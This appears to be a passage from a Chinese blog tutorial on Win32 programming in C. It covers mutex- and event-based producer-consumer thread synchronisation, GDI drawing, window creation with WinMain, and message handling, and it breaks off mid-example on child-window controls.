<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hEven;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line"><span class="type">int</span> produce;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ProduceThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		produce = <span class="number">1</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">		<span class="type">long</span> ProduceThreadID = GetCurrentThreadId();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;生产者%ul生产了一个产品\n&quot;</span>, ProduceThreadID);</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ConsumptionThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		produce = <span class="number">0</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">		<span class="type">long</span> ConsumptionThreadID = GetCurrentThreadId();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;	消费者%ul消费了一个产品\n&quot;</span>, ConsumptionThreadID);</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> produceCount = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* pProduce = &amp;produceCount;</span><br><span class="line"></span><br><span class="line">	hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);		<span class="comment">// 创建互斥体,起始状态为阻塞</span></span><br><span class="line"></span><br><span class="line">	HANDLE hPCThread[<span class="number">2</span>];</span><br><span class="line">	hPCThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ProduceThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hPCThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ConsumptionThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hPCThread, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">1</span>]);</span><br><span class="line">	CloseHandle(hMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.先创建一个互斥体</span><br><span class="line">2.创建两个线程</span><br><span class="line">3.在线程中等待互斥体</span><br><span class="line">4.互斥体锁线程后就能实现生产一次，消费一次</span><br><span class="line"></span><br><span class="line">但是，这样生产和消费的顺序可能搞反</span><br></pre></td></tr></table></figure>

<p>出现了先消费、后生产的情况：</p>
<p><img src="/2024/07/05/Win32API/image-20240306163350154.png" alt="image-20240306163350154"></p>
<p>因此可以加条件判断现在有没有产品：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hEven;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line"><span class="type">int</span> produce;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ProduceThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		<span class="keyword">if</span> (produce == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			produce = <span class="number">1</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">			<span class="type">long</span> ProduceThreadID = GetCurrentThreadId();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;生产者%ld生产了一个产品\n&quot;</span>, ProduceThreadID);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ConsumptionThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		<span class="keyword">if</span> (produce == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			produce = <span class="number">0</span>;	<span class="comment">// 消费了一个产品</span></span><br><span class="line">			<span class="type">long</span> ConsumptionThreadID = GetCurrentThreadId();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;	消费者%ul消费了一个产品\n&quot;</span>, ConsumptionThreadID);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> produceCount = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* pProduce = &amp;produceCount;</span><br><span class="line"></span><br><span class="line">	hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);		<span class="comment">// 创建互斥体,起始状态为阻塞</span></span><br><span class="line"></span><br><span class="line">	HANDLE hPCThread[<span class="number">2</span>];</span><br><span class="line">	hPCThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ProduceThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hPCThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ConsumptionThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hPCThread, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">1</span>]);</span><br><span class="line">	CloseHandle(hMutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以实现先生产、后消费。</p>
<p>但是，如果在else{i–}这里查看到底浪费了多少次循环：</p>
<p><img src="/2024/07/05/Win32API/image-20240306171259764.png" alt="image-20240306171259764" style="zoom:50%;"><img src="/2024/07/05/Win32API/image-20240306171019818.png" alt="image-20240306171019818" style="zoom:40%;"></p>
<p>输出———的地方就是浪费的时间，占用了计算资源</p>
<h4 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h4><p>所以通过通知来优化这个程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="type">int</span> container = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件</span></span><br><span class="line">HANDLE eventA;</span><br><span class="line">HANDLE eventB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="comment">// 等待事件，修改事件A状态</span></span><br><span class="line">        WaitForSingleObject(eventA, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="type">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="comment">// 生产存放进容器</span></span><br><span class="line">        container = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 给eventB设置信号</span></span><br><span class="line">        SetEvent(eventB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="comment">// 等待事件，修改事件B状态</span></span><br><span class="line">        WaitForSingleObject(eventB, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="type">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 消费</span></span><br><span class="line">        container = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 给eventA设置信号</span></span><br><span class="line">        SetEvent(eventA);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建事件</span></span><br><span class="line">    <span class="comment">// 线程同步的前提是互斥</span></span><br><span class="line">    <span class="comment">// 顺序按照先生产后消费，所以事件A设置信号，事件B需要通过生产者线程来设置信号</span></span><br><span class="line">    eventA = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">    eventB = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 事件类型也是内核对象，所以也需要关闭句柄</span></span><br><span class="line">    CloseHandle(eventA);</span><br><span class="line">    CloseHandle(eventB);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样通过事件先让生产者执行，然后让生产者告诉消费者来消费，再由消费者告诉生产者生产的顺序执行，就合理利用了计算资源。</p>
<h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><h3 id="窗口的本质"><a href="#窗口的本质" class="headerlink" title="窗口的本质"></a>窗口的本质</h3><img src="/2024/07/05/Win32API/image-20240306185445689.png" alt="image-20240306185445689" style="zoom:50%;">

<p>ntoskrnl.exe和win32k.exe是系统提供的两个模块，kernel32.dll、user32.dl、gdi32.dll可以看成是接口</p>
<p>如果要使用user32.dll绘制窗口，就是GUI，使用gdi32.dll绘制窗口就是GDI。</p>
<p>在创建窗口中使用的句柄是<code>HWND</code>，这个句柄是全局句柄，是公有的。</p>
<h3 id="绘图"><a href="#绘图" class="headerlink" title="绘图"></a>绘图</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HWND hwnd;</span><br><span class="line">	HDC hdc;</span><br><span class="line">	HPEN hpen;</span><br><span class="line">	HBRUSH hbrush;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1. 设备对象</span></span><br><span class="line">	hwnd = (HWND)<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2. 获取对象上下文</span></span><br><span class="line">	hdc = GetDC(hwnd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3. 创建画笔 设直线条属性</span></span><br><span class="line">	hpen = CreatePen(PS_SOLID, <span class="number">5</span>, RGB(<span class="number">0xff</span>, <span class="number">0x45</span>, <span class="number">0x10</span>));</span><br><span class="line">	hbrush = (HBRUSH)GetStockObject(DC_BRUSH);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4. 关联 如果不关联，会仍然使用系统提供的画笔</span></span><br><span class="line">	SelectObject(hdc, hpen);</span><br><span class="line">	SetDCBrushColor(hdc, RGB(<span class="number">0xc0</span>, <span class="number">0x30</span>, <span class="number">0x00</span>));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5. 画</span></span><br><span class="line">	LineTo(hdc, <span class="number">2560</span>, <span class="number">1600</span>);</span><br><span class="line">	Rectangle(hdc, <span class="number">200</span>, <span class="number">200</span>, <span class="number">600</span>, <span class="number">800</span>);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//6. 释放资源</span></span><br><span class="line">	DeleteObject(hpen);</span><br><span class="line">	ReleaseDC(hwnd, hdc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240306200851412.png" alt="image-20240306200851412" style="zoom:50%;">

<h2 id="Windows程序"><a href="#Windows程序" class="headerlink" title="Windows程序"></a>Windows程序</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><img src="/2024/07/05/Win32API/image-20240306203415711.png" alt="image-20240306203415711" style="zoom:50%;">

<p>入口函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, 		<span class="comment">//指向模块的句柄</span></span></span><br><span class="line"><span class="params">                     HINSTANCE hPrevInstance, 	<span class="comment">//永远为空</span></span></span><br><span class="line"><span class="params">                     PSTR szCmdLine, </span></span><br><span class="line"><span class="params">                     <span class="type">int</span> iCmdShow)</span>			   <span class="comment">//以最大化还是最小化还是隐藏等形式运行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>窗口程序没有控制台打印输出，可以输出到调试里面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">	DWORD dwAddr = (DWORD)hInstance;</span><br><span class="line">	<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Buff: %d\n&quot;</span>, dwAddr);</span><br><span class="line">	OutputDebugString(szOutBuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240307213505432.png" alt="image-20240307213505432" style="zoom:50%;">

<p>第一步，定义窗口是什么样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:28251)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">	<span class="comment">// 1.第一步：定义窗口是什么样的</span></span><br><span class="line">	TCHAR className[] = TEXT(<span class="string">&quot;Window Application&quot;</span>);			<span class="comment">//创建一个字符串，存储窗口名称</span></span><br><span class="line">	WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;								<span class="comment">//使用WNDCLASS类定义一个窗体，创建一个对象并初始化</span></span><br><span class="line">	wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;		<span class="comment">//窗口背景色-&gt;要转成画刷形式的</span></span><br><span class="line">	wndclass.lpszClassName = className;						<span class="comment">//窗口的名字</span></span><br><span class="line">	wndclass.hInstance = hInstance;							<span class="comment">//当前窗口属于哪个程序，就是属于本程序，所以把hInstance传进来</span></span><br><span class="line">	wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">	RegisterClass(&amp;wndclass);										<span class="comment">//将刚才定义好的wndclass类告诉系统一声</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2.第二步：创建并显示窗口、</span></span><br><span class="line">	HWND hwnd = CreateWindow(</span><br><span class="line">		className,							<span class="comment">//与上面定义的窗口关联</span></span><br><span class="line">		TEXT(<span class="string">&quot;My First Window&quot;</span>),			<span class="comment">//窗体名字</span></span><br><span class="line">		WS_OVERLAPPEDWINDOW,				<span class="comment">//窗体风格</span></span><br><span class="line">		<span class="number">200</span>,								<span class="comment">//相对于父窗口的x坐标</span></span><br><span class="line">		<span class="number">100</span>,								<span class="comment">//相对于父窗口的y坐标</span></span><br><span class="line">		<span class="number">600</span>,								<span class="comment">//窗体的宽度</span></span><br><span class="line">		<span class="number">400</span>,								<span class="comment">//窗体的高度	</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">//父窗口</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">//是否有菜单</span></span><br><span class="line">		hInstance,							<span class="comment">//当前窗口是属于哪个模块的</span></span><br><span class="line">		<span class="literal">NULL</span>								<span class="comment">//附加数据，先不管，填空</span></span><br><span class="line">		);</span><br><span class="line">	<span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>)						<span class="comment">//创建失败就返回</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		OutputDebugString(szOutBuff);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-10</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ShowWindow(hwnd,SW_SHOW);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3.第三步：接收消息并处理</span></span><br><span class="line">	MSG msg;</span><br><span class="line">	BOOL bRet;</span><br><span class="line">	<span class="keyword">while</span> ((bRet = GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">			OutputDebugString(szOutBuff);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 转换消息</span></span><br><span class="line">			TranslateMessage(&amp;msg);</span><br><span class="line">			<span class="comment">// 分发消息 为了调用消息处理函数将这个消息处理掉</span></span><br><span class="line">			DispatchMessage(&amp;msg);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用一下默认的消息处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240307224351324.png" alt="image-20240307224351324"></p>
<h3 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*char szOutBuff[0x80];</span></span><br><span class="line"><span class="comment">	sprintf(szOutBuff, &quot;消息类型: %d\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">	OutputDebugString(szOutBuff);*/</span></span><br><span class="line">	<span class="keyword">switch</span> (uMsg)				<span class="comment">//想要的消息使用switch接收，其他的交给默认消息处理函数</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	&#123;</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> WM_CHAR:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//MessageBox(0,TEXT(&quot;456&quot;),TEXT(&quot;123&quot;),MB_OK);</span></span><br><span class="line">		<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;按键:%x - %x - %c\n&quot;</span>, uMsg, wParam, wParam);</span><br><span class="line">		OutputDebugString(szOutBuff);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用默认的消息处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="子窗口控件"><a href="#子窗口控件" class="headerlink" title="子窗口控件"></a>子窗口控件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:28251)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_EDIT_1 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON_1 0x101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON_2 0x102</span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">    g_hInstance = hInstance;</span><br><span class="line">    <span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">    <span class="comment">// 1.第一步：定义窗口是什么样的</span></span><br><span class="line">    TCHAR className[] = TEXT(<span class="string">&quot;Window Application&quot;</span>);            <span class="comment">//创建一个字符串，存储窗口名称</span></span><br><span class="line">    WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;                                <span class="comment">//使用WNDCLASS类定义一个窗体，创建一个对象并初始化</span></span><br><span class="line">    wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;        <span class="comment">//窗口背景色-&gt;要转成画刷形式的</span></span><br><span class="line">    wndclass.lpszClassName = className;                        <span class="comment">//窗口的名字</span></span><br><span class="line">    wndclass.hInstance = hInstance;                            <span class="comment">//当前窗口属于哪个程序，就是属于本程序，所以把hInstance传进来</span></span><br><span class="line">    wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">    RegisterClass(&amp;wndclass);                                        <span class="comment">//将刚才定义好的wndclass类告诉系统一声</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.第二步：创建并显示窗口、</span></span><br><span class="line">    HWND hwnd = CreateWindow(</span><br><span class="line">        className,                            <span class="comment">//与上面定义的窗口关联</span></span><br><span class="line">        TEXT(<span class="string">&quot;My First Window&quot;</span>),            <span class="comment">//窗体名字</span></span><br><span class="line">        WS_OVERLAPPEDWINDOW,                <span class="comment">//窗体风格</span></span><br><span class="line">        <span class="number">200</span>,                                <span class="comment">//相对于父窗口的x坐标</span></span><br><span class="line">        <span class="number">100</span>,                                <span class="comment">//相对于父窗口的y坐标</span></span><br><span class="line">        <span class="number">600</span>,                                <span class="comment">//窗体的宽度</span></span><br><span class="line">        <span class="number">400</span>,                                <span class="comment">//窗体的高度    </span></span><br><span class="line">        <span class="literal">NULL</span>,                                <span class="comment">//父窗口</span></span><br><span class="line">        <span class="literal">NULL</span>,                                <span class="comment">//是否有菜单</span></span><br><span class="line">        hInstance,                            <span class="comment">//当前窗口是属于哪个模块的</span></span><br><span class="line">        <span class="literal">NULL</span>                                <span 